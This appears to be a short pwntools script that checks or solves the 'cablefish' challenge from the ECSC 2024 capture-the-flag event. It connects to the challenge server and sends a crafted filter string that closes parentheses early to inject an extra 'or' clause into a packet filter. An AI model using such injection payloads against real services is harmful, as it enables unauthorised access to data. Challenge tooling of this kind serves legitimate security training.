#!/usr/bin/env python3

import logging
import os
from pwn import remote

logging.disable()

# For TCP connection
HOST = os.environ.get("HOST", "cablefish.challs.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38005))

# Check challenge works properly
r = remote(HOST, PORT)
r.recvuntil(b'filter: ')
r.sendline(b'frame contains "flag_placeholder")) or ((udp')
r.recvuntil(b'))\n\n')
print(r.recvall(timeout=5))